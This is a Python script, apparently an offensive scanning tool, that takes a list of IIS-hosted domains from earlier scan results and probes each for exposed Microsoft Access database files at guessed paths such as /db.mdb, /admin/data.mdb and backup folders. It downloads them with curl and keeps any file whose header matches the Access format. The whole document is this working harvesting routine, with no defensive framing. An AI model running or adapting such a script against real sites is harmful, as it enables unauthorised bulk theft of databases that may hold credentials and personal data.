import json, glob, subprocess, os

domains = [json.load(open(f))["domain"] for f in sorted(glob.glob("/tmp/scan_results/*.json")) if "IIS" in json.load(open(f)).get("server","")]

mdb_paths = ["/db.mdb","/data.mdb","/database.mdb","/data/db.mdb",
             "/databackup/db.mdb","/inc/db.mdb","/admin/db.mdb",
             "/admin/data.mdb","/manager/db.mdb","/sys/db.mdb",
             "/#data.mdb","/#db.mdb","/backup/db.mdb","/bak/db.mdb"]

hits = []
for domain in domains:
    sn = domain.split(".")[0]
    all_paths = mdb_paths + ["/%s.mdb" % sn, "/data/%s.mdb" % sn]
    for path in all_paths[:8]:  # 限速：每域名只试8个路径
        url = "http://%s%s" % (domain, path)
        try:
            r = subprocess.run(["curl","-sk","--connect-timeout","4","--max-time","6",
                "-o","/tmp/mdb_dl.tmp","-w","%{http_code} %{size_download}",url],
                capture_output=True,text=True,timeout=8)
            parts = r.stdout.strip().split()
            code = parts[0] if parts else "000"
            size = int(parts[1]) if len(parts)>1 else 0
        except:
            continue
        if size > 50000 and code == "200":
            try:
                with open("/tmp/mdb_dl.tmp","rb") as f:
                    hdr = f.read(8)
                # MDB header check: 0x00 0x01 0x00 0x00
                if hdr[:4] == b"\x00\x01\x00\x00":
                    fname = "/tmp/mdb_%s.mdb" % domain.replace(".","_")
                    os.rename("/tmp/mdb_dl.tmp", fname)
                    print("HIT: %s -> %s (%d bytes)" % (url, fname, size))
                    hits.append((domain, path, size, fname))
            except: pass
        elif size > 1000 and size < 50000 and code == "200":
            with open("/tmp/mdb_dl.tmp","rb") as f: hdr = f.read(8)
            if hdr[:4] == b"\x00\x01\x00\x00":
                fname = "/tmp/mdb_%s.mdb" % domain.replace(".","_")
                os.rename("/tmp/mdb_dl.tmp", fname)
                print("HIT: %s -> %s (%d bytes)" % (url, fname, size))
                hits.append((domain,path,size,fname))
    print(".", end="", flush=True)

print("\n\nHits: %d" % len(hits))
for h in hits: print("  %s" % h[3])
